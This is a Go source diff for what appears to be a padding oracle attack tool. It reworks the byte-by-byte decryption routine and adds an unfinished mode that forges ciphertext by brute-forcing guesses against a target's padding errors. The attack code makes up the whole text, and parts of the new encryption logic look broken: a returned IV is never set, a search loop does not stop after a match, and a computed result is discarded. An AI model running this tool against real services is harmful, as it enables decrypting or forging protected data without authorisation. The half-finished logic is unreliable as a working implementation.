@@ -46,6 +46,7 @@ func PadOperations(wg *sync.WaitGroup, cfg *Config, cipherText []byte, decipherC
 		wg2.Add(1)
 		go PerBlockOperations(&wg2, *cfg, threadCh, decipherChan, blockNum+startBlock, blockData, Blocks[blockNum+startBlock-1])
 	}
+
 	wg2.Wait()
 }
 
@@ -132,9 +133,106 @@ func PerByteOperations(wg *sync.WaitGroup, threadCh chan struct{}, blockDecipher
 		// padBlock := BuildPaddedBlock(IV, blockData, bruteForceByteValue, cfg.blockSize)
 
 		encodedPayload := cfg.Pad.EncodePayload(RawOracleData)
-		resp := cfg.Pad.CallOracle(encodedPayload)
 		cfg.MetricsChan <- 1
-		if cfg.Pad.CheckResponse(resp) { // this one didn't return a pad error - we've probably decrypted it!
+		if cfg.Pad.CallOracle(encodedPayload) { // this one didn't return a pad error - we've probably decrypted it!
+			defer wg.Done()
+			continueChan <- true
+			close(continueChan)
+			blockDecipherChan <- byte(bruteForceByteValue)
+			if byteNum == cfg.BlockSize {
+				close(blockDecipherChan)
+			}
+			return true
+		}
+		return false // This is to aid with detection of the final ciphertext's pad byte
+	}
+}
+
+func PadOperationsEncrypt(wg *sync.WaitGroup, cfg *Config, plainText []byte) {
+	defer func() {
+		wg.Done()
+	}()
+
+	// IV was supplied by the user - let's prepend to the Plaintext
+	if cfg.IV != nil {
+		plainText = append(cfg.IV, plainText...)
+	}
+	// So at this point plaintext should look like:
+	// [Block0: IV][Block1 - Block n-1: Target Plaintext to be "encrypted"]
+
+	// Chunk up the PKCS7-padded plaintext into BS-sized blocks
+	plainTextChunks := ChunkBytes(Pad(plainText, cfg.BlockSize), cfg.BlockSize)
+
+	// New slice to store our resulting ciphertext in; it needs space for the iv and final ciphertext block
+	cipherTextChunks := make([][]byte, len(plainTextChunks)+1)
+
+	// We need a 'random' last block. It doesn't actually have to be random so I've filled it with A's
+	cipherTextChunks[len(cipherTextChunks)-1] = GenerateFullSlice(0x41, cfg.BlockSize)
+	// Reverse the order of the search
+	for i := len(plainTextChunks) - 1; i >= 0; i-- {
+		// Grab the next ciphertext and target plaintext blocks from the array
+		ct := cipherTextChunks[i+1]
+		nextCt := PerBlockOperationsEncrypt(*cfg, i, ct, plainTextChunks[i])
+		// prepend the next ciphertext chunk to the list for processing
+		cipherTextChunks[i] = nextCt
+	}
+}
+
+// Encrypting works a little differently, and is dependent on the previous block being calculated, unlike decrypting :(. Paralleling this operation is likely not possible?
+func PerBlockOperationsEncrypt(cfg Config, blockNum int, cipherText []byte, plaintText []byte) (iv []byte) {
+	// threadCh := make(chan struct{}, cfg.Threads)
+	rangeData := GetRangeDataSafe()
+	decipheredBlockBytes := []byte{}
+	var RawOracleData []byte
+
+	for byteNum, _ := range plaintText { // Iterate over each byte
+		for _, i := range rangeData {
+			padBlock := BuildPaddingBlock(byteNum, cfg.BlockSize)                   // gives us [0x00,...,0x01] -> [0x10, ..., 0x10]
+			searchBlock := BuildSearchBlock(decipheredBlockBytes, i, cfg.BlockSize) // gives us the modified IV block, mutating the last byte backwards
+			nextPadBlock := BuildPaddingBlock(byteNum+1, cfg.BlockSize)             // gives us [0x00,...,0x01] -> [0x10, ..., 0x10]
+			if byteNum > cfg.BlockSize {
+				nextPadBlock[byteNum] = 0x00
+			}
+			RawOracleData = BuildRawOraclePayload(searchBlock, cipherText)
+			// padBlock := BuildPaddedBlock(IV, blockData, bruteForceByteValue, cfg.blockSize)
+			encodedPayload := cfg.Pad.EncodePayload(RawOracleData)
+			// cfg.MetricsChan <- 1
+			if !cfg.Pad.CallOracle(encodedPayload) {
+				continue
+			}
+			decipheredBlockBytes = append([]byte{byte(i)}, decipheredBlockBytes...) // prepend the found byte
+			// tmp := XORBytes(searchBlock, cipherText)
+			// oracleIvBlock := XORBytes(tmp, padBlock)
+			tmp := XORBytes(decipheredBlockBytes, padBlock[byteNum:])
+			decipheredBlockBytes = XORBytes(tmp, nextPadBlock[byteNum:])
+		}
+
+	}
+	return iv
+}
+
+// PerByteOperations performs the actual math on each byte of the CipherText
+func PerByteOperationsEncrypt(wg *sync.WaitGroup, threadCh chan struct{}, blockDecipherChan chan byte, cfg Config, bruteForceByteValue int, byteNum int, blockNum int, blockData []byte, IV []byte, decipheredBlockBytes []byte, continueChan chan bool) bool {
+	defer func() {
+		<-threadCh // Release a thread once we're done with this goroutine
+	}()
+	select {
+	case <-continueChan:
+		return false
+	default:
+		var RawOracleData []byte
+		// Math here - all the XORing and building of weird padding happens in these routines
+		padBlock := BuildPaddingBlock(byteNum, cfg.BlockSize)
+		searchBlock := BuildSearchBlock(decipheredBlockBytes, bruteForceByteValue, cfg.BlockSize)
+		tmp := XORBytes(searchBlock, IV)
+		oracleIvBlock := XORBytes(tmp, padBlock)
+
+		RawOracleData = BuildRawOraclePayload(oracleIvBlock, blockData)
+		// padBlock := BuildPaddedBlock(IV, blockData, bruteForceByteValue, cfg.blockSize)
+
+		encodedPayload := cfg.Pad.EncodePayload(RawOracleData)
+		cfg.MetricsChan <- 1
+		if cfg.Pad.CallOracle(encodedPayload) { // this one didn't return a pad error - we've probably decrypted it!
 			defer wg.Done()
 			continueChan <- true
 			close(continueChan)
